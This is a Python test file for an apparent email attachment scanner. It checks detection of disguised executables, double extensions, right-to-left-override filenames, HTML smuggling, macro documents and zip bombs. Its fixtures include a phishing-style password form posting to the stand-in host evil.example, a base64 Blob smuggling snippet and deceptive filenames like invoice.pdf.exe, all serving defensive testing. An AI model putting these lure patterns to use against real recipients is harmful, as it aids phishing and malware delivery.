from __future__ import annotations

import io
import zipfile

import pytest
from conftest import build_email, ids, run

from dayag.filetypes import extensions, inspect_attachment, sniff
from dayag.parsing import RawAttachment

RLO = "\N{RIGHT-TO-LEFT OVERRIDE}"


def with_attachment(name: str, data: bytes, mime: str = "application/octet-stream"):
    return run(build_email(attachments=[(name, data, mime)]))


def zip_bytes(files: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buffer.getvalue()


@pytest.mark.parametrize(
    ("data", "kind"),
    [
        (b"MZ\x90\x00", "pe"),
        (b"%PDF-1.7\n", "pdf"),
        (b"\x7fELF\x02", "elf"),
        (bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 8, "ole"),
        (bytes.fromhex("4C0000000114020000000000C000000000000046"), "lnk"),
        (b"Rar!\x1a\x07\x00", "rar"),
        (b"\x89PNG\r\n\x1a\n", "png"),
        (b"<!DOCTYPE html><html>", "html"),
        (b"  <svg xmlns='http://www.w3.org/2000/svg'>", "svg"),
        (b"{\\rtf1\\ansi", "rtf"),
        (b"#!/bin/sh\n", "script"),
        (b"plain words", "text"),
        (b"\x00\x01\x02\x03", "unknown"),
    ],
)
def test_sniff(data: bytes, kind: str) -> None:
    assert sniff(data) == kind


def test_sniff_iso() -> None:
    data = bytearray(0x9000)
    data[0x8001:0x8006] = b"CD001"
    assert sniff(bytes(data)) == "iso"


def test_extensions() -> None:
    assert extensions("Invoice.PDF   .exe") == ["pdf", "exe"]
    assert extensions("noextension") == []


def test_hashes() -> None:
    info = inspect_attachment(RawAttachment("a.txt", "text/plain", b"abc"))
    assert info.sha256 == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    assert info.md5 == "900150983cd24fb0d6963f7d28e17f72"


def test_executable() -> None:
    assert "ATT-EXECUTABLE" in ids(with_attachment("setup.exe", b"MZ\x90\x00"))


def test_executable_detected_by_content_despite_name() -> None:
    report = with_attachment("invoice.pdf", b"MZ\x90\x00" + b"\x00" * 64)
    assert {"ATT-EXECUTABLE", "ATT-TYPE-MISMATCH"} <= ids(report)


def test_double_extension() -> None:
    assert "ATT-DOUBLE-EXT" in ids(with_attachment("invoice.pdf.exe", b"MZ"))
    assert "ATT-DOUBLE-EXT" in ids(with_attachment("invoice.pdf          .js", b"x"))
    assert "ATT-DOUBLE-EXT" not in ids(with_attachment("report.v2.pdf", b"%PDF-1.4"))


def test_right_to_left_override() -> None:
    report = with_attachment(f"invoice{RLO}fdp.exe", b"MZ")
    assert "ATT-RTLO" in ids(report)
    shown = report.attachments[0].filename
    assert RLO in shown  # the raw name is kept for hashing/IOCs...
    finding = next(f for f in report.findings if f.rule.id == "ATT-RTLO")
    assert RLO not in finding.detail  # ...but never displayed raw
    assert "[U+202E]" in finding.detail


def test_html_smuggling() -> None:
    html = b"<html><script>var b=new Blob([Uint8Array.from(atob('QQ=='))]);</script></html>"
    report = with_attachment("doc.html", html, "text/html")
    assert {"ATT-HTML", "ATT-HTML-SMUGGLING"} <= ids(report)


def test_html_attachment_with_login_form() -> None:
    html = b'<html><form action="https://evil.example/p"><input type="password"></form></html>'
    report = with_attachment("secure-message.htm", html, "text/html")
    assert "ATT-HTML" in ids(report)
    assert "ATT-HTML-SMUGGLING" not in ids(report)
    assert {"form", "password field"} <= set(report.attachments[0].html_traits)
    assert any(link.url == "https://evil.example/p" for link in report.links)


def test_archive_listing_without_extraction() -> None:
    report = with_attachment(
        "docs.zip", zip_bytes({"a.txt": b"x", "Invoice.pdf.lnk": b"x"}), "application/zip"
    )
    assert "ATT-ARCHIVE-RISKY" in ids(report)
    assert report.attachments[0].archive_members == ["a.txt", "Invoice.pdf.lnk"]


def test_harmless_archive() -> None:
    report = with_attachment("photos.zip", zip_bytes({"a.jpg": b"x"}), "application/zip")
    assert not {i for i in ids(report) if i.startswith("ATT-")}


def test_macro_document() -> None:
    docm = zip_bytes({"[Content_Types].xml": b"<Types/>", "word/vbaProject.bin": b"x"})
    report = with_attachment("order.docx", docm)
    assert "ATT-MACRO" in ids(report)
    assert report.attachments[0].kind == "ooxml"


def test_legacy_office_macros() -> None:
    ole = bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 64 + "_VBA_PROJECT".encode("utf-16-le")
    assert "ATT-MACRO" in ids(with_attachment("order.doc", ole))


def test_disk_image_and_onenote() -> None:
    assert "ATT-DISK-IMAGE" in ids(with_attachment("photos.iso", b"\x00" * 10))
    assert "ATT-ONENOTE" in ids(
        with_attachment("notes.one", bytes.fromhex("E4525C7B8CD8A74DAEB15378D02996D3"))
    )


def test_zip_bomb_is_not_decompressed() -> None:
    bomb = io.BytesIO()
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", b"<Types/>")
        zf.writestr("word/_rels/huge.rels", b"A" * 50_000_000)
    report = with_attachment("big.docx", bomb.getvalue())
    assert report.attachments[0].kind == "ooxml"  # inspected, bounded read, no crash
